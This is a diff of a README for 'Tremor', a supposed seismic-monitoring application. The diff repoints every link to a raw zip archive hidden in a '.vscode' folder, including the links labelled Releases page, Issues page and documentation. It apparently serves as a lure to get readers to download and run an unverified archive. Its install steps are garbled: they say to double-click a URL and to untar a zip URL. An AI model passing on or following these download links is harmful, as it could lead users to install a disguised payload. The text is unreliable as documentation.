@@ -6,7 +6,7 @@ Tremor is a user-friendly application designed to help you monitor seismic activ
 ## 🚀 Getting Started
 Getting started with Tremor is simple. Follow the steps below to download and install the application.
 
-[![Download Tremor](https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip%20Tremor-Here-brightgreen)](https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip)
+[![Download Tremor](https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip%20Tremor-Here-brightgreen)](https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip)
 
 ## 💻 System Requirements
 Before you download Tremor, ensure your system meets the following requirements:
@@ -21,33 +21,33 @@ If your system meets these requirements, you are ready to proceed to the next st
 ## 📥 Download & Install
 To download and install Tremor, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip).
 2. On the Releases page, you will find a list of available versions of Tremor.
 3. Locate the latest version and click on it.
 4. Scroll down to the "Assets" section. This section contains the files available for download.
 5. Choose the appropriate file for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip`.
-   - For Linux, download `https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip`.
 
 6. Once the download is complete, locate the downloaded file on your computer.
 7. Follow the installation instructions below based on your operating system.
 
 ### Windows Installation
-- Double-click on `https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip`.
+- Double-click on `https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip`.
 - Follow the prompts from the installation wizard.
 - Choose your installation folder, and click “Install”.
 - Once the installation finishes, you can find Tremor in your Start Menu.
 
 ### macOS Installation
-- Double-click on `https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip`.
+- Double-click on `https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip`.
 - Drag the Tremor icon into your Applications folder.
 - Eject the disk image and open Tremor from your Applications.
 
 ### Linux Installation
-- Extract the `https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip` file using your package manager or terminal:
+- Extract the `https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip` file using your package manager or terminal:
   ```bash
-  tar -xvzf https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip
+  tar -xvzf https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip
   ```
 - Navigate to the extracted folder:
   ```bash
@@ -71,12 +71,12 @@ After installation, running Tremor is straightforward.
 - **Settings** lets you configure alerts for specific seismic events.
 
 ## 🌐 Support & Feedback
-If you encounter any issues or have questions, you can reach out for support. You can open a new issue on the [GitHub Issues page](https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip), and our team will assist you as soon as possible.
+If you encounter any issues or have questions, you can reach out for support. You can open a new issue on the [GitHub Issues page](https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip), and our team will assist you as soon as possible.
 
 We appreciate your feedback. If you enjoy using Tremor or have suggestions for improvements, please let us know.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip) - Comprehensive guides and FAQs.
-- [Earthquake Data Sources](https://raw.githubusercontent.com/elbenouhb5/tremor/main/anise/tremor.zip) - Useful for understanding seismic data.
+- [Official Documentation](https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip) - Comprehensive guides and FAQs.
+- [Earthquake Data Sources](https://raw.githubusercontent.com/elbenouhb5/tremor/main/.vscode/Software-3.8.zip) - Useful for understanding seismic data.
 
 Thank you for choosing Tremor. We hope it enhances your experience in monitoring seismic activities. Enjoy exploring!
